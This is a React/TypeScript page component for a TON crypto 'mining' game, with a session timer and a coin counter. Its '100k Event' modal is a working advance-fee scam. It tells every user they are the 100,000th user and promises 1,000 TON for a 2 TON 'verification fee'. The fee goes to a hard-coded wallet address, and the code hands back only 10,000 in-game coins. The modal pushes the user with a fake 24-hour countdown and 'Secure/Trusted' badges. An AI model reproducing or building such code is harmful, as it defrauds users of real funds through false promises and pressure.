"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Play, Crown, Store, Award, Star, Sparkles, Gift } from 'lucide-react';
import { useSpaceCoins } from '../hooks/useSpaceCoins';
import { useTonConnectUI } from '@tonconnect/ui-react';
import { useToast } from '@/hooks/use-toast';

interface MiningPageProps {
  onNavigate?: (page: string) => void;
}

const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
  const {
    spaceCoins,
    addCoins
  } = useSpaceCoins();
  const [tonConnectUI] = useTonConnectUI();
  const { toast } = useToast();
  const [miningSpeed, setMiningSpeed] = useState(1);
  const [coinsPerSecond, setCoinsPerSecond] = useState(0.1);
  const [miningActive, setMiningActive] = useState(false);
  const [remainingTime, setRemainingTime] = useState(28800); // 8 hours
  const [username, setUsername] = useState('');
  const [show100kModal, setShow100kModal] = useState(false);
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const initializedRef = useRef(false);
  const lastProcessedTimeRef = useRef<number>(0);

  // Target address for 100k event payment
  const TARGET_PAYMENT_ADDRESS = 'UQBJSGcoWTcjdkWFSxA4A6sLmnD5uFKoKHFEHc3LqGJvFWya';

  // Memoized coin adding function to prevent unnecessary re-renders
  const addCoinsStable = useCallback((amount: number) => {
    addCoins(amount);
  }, [addCoins]);

  // Prevent scrolling when component loads
  useEffect(() => {
    document.body.style.overflow = 'hidden';
    document.documentElement.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = 'auto';
      document.documentElement.style.overflow = 'auto';
    };
  }, []);

  // Initialize component data once
  useEffect(() => {
    if (initializedRef.current) return;
    initializedRef.current = true;
    console.log('Initializing mining page...');

    // Load username
    const storedUsername = localStorage.getItem('username');
    if (storedUsername) {
      setUsername(storedUsername);
    }

    // Load mining speed
    const storedMiningSpeed = localStorage.getItem('miningSpeed');
    const currentMiningSpeed = storedMiningSpeed ? parseFloat(storedMiningSpeed) : 1;
    setMiningSpeed(currentMiningSpeed);
    setCoinsPerSecond(0.1 * currentMiningSpeed);

    // Restore mining state
    restoreMiningState(currentMiningSpeed);
  }, []);

  const restoreMiningState = (currentMiningSpeed: number) => {
    const miningStartTime = localStorage.getItem('miningStartTime');
    const miningDuration = localStorage.getItem('miningDuration');
    const wasMiningActive = localStorage.getItem('miningActive') === 'true';
    const lastProcessedTime = localStorage.getItem('lastProcessedTime');
    console.log('Restoring mining state:', {
      wasMiningActive,
      miningStartTime,
      miningDuration,
      lastProcessedTime
    });
    if (wasMiningActive && miningStartTime && miningDuration) {
      const startTime = parseInt(miningStartTime);
      const duration = parseInt(miningDuration);
      const currentTime = Date.now();
      const elapsedTimeMs = currentTime - startTime;
      const elapsedTimeSeconds = Math.floor(elapsedTimeMs / 1000);

      // Get the last processed time to avoid duplicate calculations
      const lastProcessed = lastProcessedTime ? parseInt(lastProcessedTime) : startTime;
      const unprocessedTimeMs = currentTime - lastProcessed;
      const unprocessedTimeSeconds = Math.floor(unprocessedTimeMs / 1000);
      console.log('Mining restoration details:', {
        startTime: new Date(startTime).toLocaleString(),
        currentTime: new Date(currentTime).toLocaleString(),
        lastProcessed: new Date(lastProcessed).toLocaleString(),
        elapsedTimeSeconds,
        unprocessedTimeSeconds,
        duration
      });
      if (elapsedTimeSeconds < duration && elapsedTimeSeconds >= 0) {
        // Mining is still active
        const newRemainingTime = Math.max(0, duration - elapsedTimeSeconds);
        setMiningActive(true);
        setRemainingTime(newRemainingTime);

        // Calculate coins earned only for unprocessed time
        const baseCoinsPerSecond = 0.1;
        const coinsEarned = Math.round(Math.max(0, unprocessedTimeSeconds) * (baseCoinsPerSecond * currentMiningSpeed) * 100) / 100;
        console.log('Adding offline mining coins for unprocessed time:', coinsEarned);
        if (coinsEarned > 0) {
          addCoinsStable(coinsEarned);
        }

        // Update last processed time
        localStorage.setItem('lastProcessedTime', currentTime.toString());
        lastProcessedTimeRef.current = currentTime;
      } else if (elapsedTimeSeconds >= duration) {
        // Mining session completed while away
        console.log('Mining session completed while offline');
        completeMiningSession(duration, currentMiningSpeed, lastProcessed, startTime + duration * 1000);
      } else {
        // Invalid state, reset
        resetMiningState();
      }
    }
  };

  const completeMiningSession = (duration: number, currentMiningSpeed: number, lastProcessed: number, sessionEndTime: number) => {
    setMiningActive(false);
    setRemainingTime(28800);

    // Calculate coins only for the remaining unprocessed time until session end
    const unprocessedTime = Math.max(0, Math.floor((sessionEndTime - lastProcessed) / 1000));
    const baseCoinsPerSecond = 0.1;
    const totalCoinsEarned = Math.round(unprocessedTime * (baseCoinsPerSecond * currentMiningSpeed) * 100) / 100;
    console.log('Adding coins from completed session (unprocessed time only):', totalCoinsEarned);
    if (totalCoinsEarned > 0) {
      addCoinsStable(totalCoinsEarned);
    }
    resetMiningState();
  };

  const resetMiningState = () => {
    localStorage.removeItem('miningStartTime');
    localStorage.removeItem('miningDuration');
    localStorage.removeItem('lastProcessedTime');
    localStorage.setItem('miningActive', 'false');
    lastProcessedTimeRef.current = 0;
  };

  // Handle mining interval - Fixed to prevent infinite loop
  useEffect(() => {
    // Clear any existing interval
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }

    // Only start interval if mining is active and there's time remaining
    if (miningActive && remainingTime > 0) {
      console.log('Starting mining interval');
      intervalRef.current = setInterval(() => {
        const currentTime = Date.now();
        setRemainingTime(prevTime => {
          const newTime = Math.max(0, prevTime - 1);
          if (newTime <= 0) {
            console.log('Mining session completed');
            setMiningActive(false);
            resetMiningState();
            return 0;
          }
          return newTime;
        });

        // Add coins with stable reference and update last processed time
        const coinsToAdd = Math.round(coinsPerSecond * 100) / 100;
        if (coinsToAdd > 0) {
          addCoinsStable(coinsToAdd);
        }

        // Update last processed time every second
        localStorage.setItem('lastProcessedTime', currentTime.toString());
        lastProcessedTimeRef.current = currentTime;
      }, 1000);
    }

    // Cleanup function
    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
    };
  }, [miningActive, remainingTime, coinsPerSecond, addCoinsStable]);

  // Save mining speed when it changes
  useEffect(() => {
    if (miningSpeed > 0) {
      localStorage.setItem('miningSpeed', miningSpeed.toString());
      setCoinsPerSecond(0.1 * miningSpeed);
    }
  }, [miningSpeed]);

  // Save mining state when it changes
  useEffect(() => {
    localStorage.setItem('miningActive', miningActive.toString());
  }, [miningActive]);

  const handleStartMining = () => {
    if (!miningActive && remainingTime > 0) {
      const currentTime = Date.now();
      const duration = 28800; // 8 hours in seconds

      console.log('Starting mining session');

      // Save mining state
      localStorage.setItem('miningStartTime', currentTime.toString());
      localStorage.setItem('miningDuration', duration.toString());
      localStorage.setItem('lastProcessedTime', currentTime.toString());
      localStorage.setItem('miningActive', 'true');
      setMiningActive(true);
      setRemainingTime(duration);
      lastProcessedTimeRef.current = currentTime;
    }
  };

  const formatTime = (timeInSeconds: number): string => {
    const hours = Math.floor(timeInSeconds / 3600);
    const minutes = Math.floor(timeInSeconds % 3600 / 60);
    const seconds = timeInSeconds % 60;
    return `${hours}h ${minutes}m ${seconds}s`;
  };

  // Handle page visibility change to save state
  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.hidden && miningActive) {
        // Save current state when page becomes hidden
        const currentTime = Date.now();
        localStorage.setItem('lastProcessedTime', currentTime.toString());
        lastProcessedTimeRef.current = currentTime;
        console.log('Saving mining state when page hidden');
      }
    };
    const handleBeforeUnload = () => {
      if (miningActive) {
        const currentTime = Date.now();
        localStorage.setItem('lastProcessedTime', currentTime.toString());
      }
    };
    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [miningActive]);

  const handle100kUserEvent = () => {
    setShow100kModal(true);
  };

  const handlePayment = async () => {
    if (!tonConnectUI.wallet) {
      toast({
        title: 'Wallet Not Connected',
        description: 'Please connect your TON wallet first from the wallet page',
        variant: "destructive"
      });
      return;
    }

    setIsProcessingPayment(true);
    
    try {
      // Create a simple transaction without complex payload encoding
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
        messages: [
          {
            address: TARGET_PAYMENT_ADDRESS,
            amount: (2 * 1000000000).toString(), // 2 TON in nanoTON (1e9)
            // Remove complex payload to avoid encoding issues
          },
        ],
      };

      console.log('Sending transaction:', transaction);
      const result = await tonConnectUI.sendTransaction(transaction);
      
      console.log('Payment transaction sent successfully:', result);
      
      toast({
        title: '✅ Payment Sent Successfully!',
        description: '2 TON has been sent successfully. Your reward will be processed soon.',
      });
      
      setShow100kModal(false);
      
      // Add bonus coins as a reward for completing the payment
      addCoinsStable(10000); // Bonus coins for participating
      
    } catch (error) {
      console.error('Payment failed:', error);
      
      let errorMessage = 'Failed to send transaction. Please try again.';
      
      if (error instanceof Error) {
        if (error.message.includes('User declined') || error.message.includes('rejected')) {
          errorMessage = 'Transaction was cancelled by user.';
        } else if (error.message.includes('insufficient funds')) {
          errorMessage = 'Insufficient funds in wallet.';
        } else if (error.message.includes('Invalid data format')) {
          errorMessage = 'Transaction format error. Please try again.';
        }
      }
      
      toast({
        title: 'Payment Failed',
        description: errorMessage,
        variant: "destructive"
      });
    } finally {
      setIsProcessingPayment(false);
    }
  };

  const handleQuickNavigation = (page: string) => {
    if (onNavigate) {
      onNavigate(page);
    }
  };

  return (
    <div className="fixed inset-0 overflow-hidden">
      {/* Background Image - Full Screen Coverage */}
      <div 
        className="fixed inset-0 bg-cover bg-center bg-no-repeat" 
        style={{
          backgroundImage: `url('/lovable-uploads/836a3d93-ee4f-4c26-9fd4-cf95f416631c.png')`
        }} 
      />
      
      {/* Top Navigation Buttons */}
      <div className="fixed top-4 left-0 right-0 z-20 px-4">
        <div className="flex justify-center space-x-6">
          {/* 100,000th User Event Button - Enhanced with animation */}
          <div className="flex flex-col items-center">
            <Button 
              onClick={handle100kUserEvent}
              className="w-12 h-12 rounded-full bg-gradient-to-r from-yellow-400 via-yellow-500 to-orange-500 hover:from-yellow-500 hover:via-yellow-600 hover:to-orange-600 shadow-xl border-2 border-yellow-300/70 hover:scale-110 transition-all duration-300 p-0 animate-pulse-glow relative overflow-hidden"
              title="100,000th User Event"
            >
              {/* Sparkle effect */}
              <div className="absolute inset-0 opacity-30">
                <Sparkles className="w-3 h-3 absolute top-1 left-1 text-white animate-pulse" />
                <Star className="w-2 h-2 absolute bottom-1 right-1 text-white animate-pulse delay-500" />
              </div>
              <Award className="w-6 h-6 text-white drop-shadow-md z-10 relative" />
            </Button>
            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">100k Event</span>
          </div>

          {/* Daily Rush Button */}
          <div className="flex flex-col items-center">
            <Button 
              onClick={() => handleQuickNavigation('daily-rush')}
              className="w-12 h-12 rounded-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 shadow-lg border-2 border-yellow-400/50 hover:scale-105 transition-all duration-300 p-0"
              title="Daily Rush"
            >
              <Crown className="w-6 h-6 text-white" />
            </Button>
            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">Daily Rush</span>
          </div>
          
          {/* Store Button */}
          <div className="flex flex-col items-center">
            <Button 
              onClick={() => handleQuickNavigation('store')}
              className="w-12 h-12 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 shadow-lg border-2 border-purple-400/50 hover:scale-105 transition-all duration-300 p-0"
              title="Store"
            >
              <Store className="w-6 h-6 text-white" />
            </Button>
            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">Store</span>
          </div>
        </div>
      </div>
      
      {/* Content positioned at bottom */}
      <div className="fixed bottom-0 left-0 right-0 z-10 p-6 pb-20 flex flex-col items-center py-[50px]">
        {/* Username with Matrix-style font */}
        {username && (
          <div className="text-center mb-4">
            <p className="text-white text-2xl font-bold font-mono" style={{
              fontVariantNumeric: 'tabular-nums'
            }}>
              {username}
            </p>
          </div>
        )}

        {/* Balance */}
        <div className="flex items-center justify-center gap-3 mb-4">
          <div className="w-10 h-10 rounded-full flex items-center justify-center overflow-hidden">
            <img 
              src="/lovable-uploads/46b9f7e6-4f32-4240-9fc4-16d1bcdec0d0.png" 
              alt="Space Coin" 
              className="w-full h-full object-cover" 
            />
          </div>
          <span className="text-white text-3xl font-bold">
            {Math.floor(spaceCoins).toLocaleString()}
          </span>
        </div>

        {/* Mining Rate Display */}
        {miningActive && (
          <div className="text-center mb-2">
            <p className="text-green-400 text-sm">
              Mining: {(coinsPerSecond * 3600).toFixed(2)} coins/hour
            </p>
          </div>
        )}

        {/* Mining Time Display - Only show when mining is active */}
        {miningActive && (
          <div className="text-center mb-4">
            <p className="text-white text-lg">Mining time remaining:</p>
            <p className="text-white text-xl font-bold">{formatTime(remainingTime)}</p>
          </div>
        )}

        {/* Mining Button - Only show Start Mining button when not mining */}
        {!miningActive && (
          <div className="flex justify-center">
            <Button 
              onClick={handleStartMining} 
              disabled={remainingTime <= 0} 
              className="py-4 px-8 text-lg font-bold rounded-xl transition-all duration-300 bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              <div className="flex items-center justify-center gap-2">
                <Play className="w-5 h-5" />
                <span>Start Mining</span>
              </div>
            </Button>
          </div>
        )}

        {/* Debug info (will be removed in production) */}
        {process.env.NODE_ENV === 'development' && (
          <div className="text-white text-xs mt-4 text-center opacity-50">
            {/* Debug information */}
          </div>
        )}
      </div>

      {/* Enhanced 100k User Event Modal */}
      <Dialog open={show100kModal} onOpenChange={setShow100kModal}>
        <DialogContent className="bg-gradient-to-br from-slate-900 via-blue-900 to-purple-900 border-4 border-gold-400/80 text-white max-w-md mx-auto rounded-2xl shadow-2xl backdrop-blur-sm overflow-hidden relative">
          {/* Animated background sparkles */}
          <div className="absolute inset-0 opacity-20">
            <div className="absolute top-4 left-4 w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></div>
            <div className="absolute top-8 right-6 w-1 h-1 bg-blue-400 rounded-full animate-pulse delay-300"></div>
            <div className="absolute bottom-6 left-8 w-1.5 h-1.5 bg-pink-400 rounded-full animate-pulse delay-700"></div>
            <div className="absolute bottom-4 right-4 w-2 h-2 bg-green-400 rounded-full animate-pulse delay-1000"></div>
          </div>

          <DialogHeader className="text-center relative z-10">
            <DialogTitle className="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 mb-3 flex items-center justify-center gap-2">
              <Gift className="w-6 h-6 text-yellow-400 animate-bounce" />
              🎉 100,000th User! 🎉
              <Gift className="w-6 h-6 text-yellow-400 animate-bounce delay-150" />
            </DialogTitle>
          </DialogHeader>
          
          <div className="space-y-4 text-center relative z-10">
            {/* Congratulations Section */}
            <div className="bg-gradient-to-r from-yellow-900/60 to-orange-900/60 rounded-xl p-4 border-2 border-yellow-400/40 shadow-lg backdrop-blur-sm">
              <div className="flex items-center justify-center gap-2 mb-2">
                <Star className="w-5 h-5 text-yellow-400 animate-spin" />
                <h3 className="text-lg font-bold text-yellow-300">
                  🏆 Congratulations! 🏆
                </h3>
                <Star className="w-5 h-5 text-yellow-400 animate-spin delay-300" />
              </div>
              <p className="text-sm text-yellow-100 font-medium">
                You are our special 100,000th user!
              </p>
              <p className="text-xs text-yellow-200/80 mt-1">
                This is a once-in-a-lifetime opportunity
              </p>
            </div>

            {/* Reward Section */}
            <div className="bg-gradient-to-r from-green-900/60 to-emerald-900/60 rounded-xl p-4 border-2 border-green-400/40 shadow-lg backdrop-blur-sm">
              <div className="flex items-center justify-center space-x-3 mb-2">
                <div className="animate-bounce">💎</div>
                <span className="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-emerald-400">
                  1,000 TON
                </span>
                <div className="animate-bounce delay-150">💎</div>
              </div>
              <div className="flex items-center justify-center gap-1 text-green-300 text-sm font-medium">
                <Sparkles className="w-4 h-4" />
                <span>Exclusive Reward Reserved</span>
                <Sparkles className="w-4 h-4" />
              </div>
              <p className="text-xs text-green-200/80 mt-1">Worth $6,000+ USD</p>
            </div>

            {/* Timer Section */}
            <div className="bg-gradient-to-r from-red-900/60 to-pink-900/60 rounded-xl p-3 border-2 border-red-400/40 shadow-lg backdrop-blur-sm">
              <div className="flex items-center justify-center gap-2 text-red-300">
                <span className="text-lg animate-pulse">⏰</span>
                <span className="text-sm font-bold">Limited Time: 24 Hours Only</span>
                <span className="text-lg animate-pulse delay-500">⏰</span>
              </div>
              <div className="w-full bg-red-800/40 rounded-full h-2 mt-2">
                <div className="bg-gradient-to-r from-red-400 to-pink-400 h-2 rounded-full w-3/4 animate-pulse"></div>
              </div>
            </div>

            {/* Requirements Section */}
            <div className="bg-gradient-to-r from-blue-900/60 to-indigo-900/60 rounded-xl p-4 border-2 border-blue-400/40 shadow-lg backdrop-blur-sm">
              <h4 className="text-blue-300 font-semibold mb-2 flex items-center justify-center gap-2">
                <span className="text-lg">🛡️</span>
                Verification Required
                <span className="text-lg">🛡️</span>
              </h4>
              <p className="text-xs text-blue-200 mb-2">
                Processing fee: <span className="font-bold text-blue-100">2 TON</span> to verify your wallet
              </p>
              <div className="flex items-center justify-center gap-2 text-xs text-blue-300">
                <span>🔒</span>
                <span>Anti-Bot Security</span>
                <span>•</span>
                <span>Platform Protection</span>
                <span>🔒</span>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="space-y-3 pt-2">
              <Button 
                onClick={handlePayment}
                disabled={isProcessingPayment || !tonConnectUI.wallet}
                className="w-full bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500 hover:from-green-600 hover:via-emerald-600 hover:to-teal-600 text-white font-bold py-3 px-4 rounded-xl shadow-2xl hover:scale-105 transition-all duration-300 text-sm disabled:opacity-50 disabled:cursor-not-allowed border-2 border-green-400/30 relative overflow-hidden"
              >
                {/* Button shine effect */}
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -skew-x-12 transform -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
                
                {isProcessingPayment ? (
                  <div className="flex items-center gap-2 relative z-10">
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                    <span>Processing Payment...</span>
                  </div>
                ) : !tonConnectUI.wallet ? (
                  <div className="flex items-center gap-2 relative z-10">
                    <span className="text-lg">🔗</span>
                    <span>Connect Wallet First</span>
                  </div>
                ) : (
                  <div className="flex items-center gap-2 relative z-10">
                    <span className="text-lg">💳</span>
                    <span>Pay 2 TON → Get 1,000 TON</span>
                    <span className="text-lg">🚀</span>
                  </div>
                )}
              </Button>
              
              <Button 
                onClick={() => setShow100kModal(false)}
                variant="outline"
                className="w-full border-2 border-gray-400/60 text-gray-300 hover:bg-gray-800/60 hover:text-white text-sm py-2 rounded-xl backdrop-blur-sm transition-all duration-300"
                disabled={isProcessingPayment}
              >
                Maybe Later
              </Button>
            </div>

            {/* Trust Indicators */}
            <div className="flex items-center justify-center gap-4 text-xs text-gray-400 pt-2 border-t border-gray-700/50">
              <div className="flex items-center gap-1">
                <span>🔐</span>
                <span>Secure</span>
              </div>
              <div className="flex items-center gap-1">
                <span>🌟</span>
                <span>Trusted</span>
              </div>
              <div className="flex items-center gap-1">
                <span>⚡</span>
                <span>Instant</span>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default MiningPage;
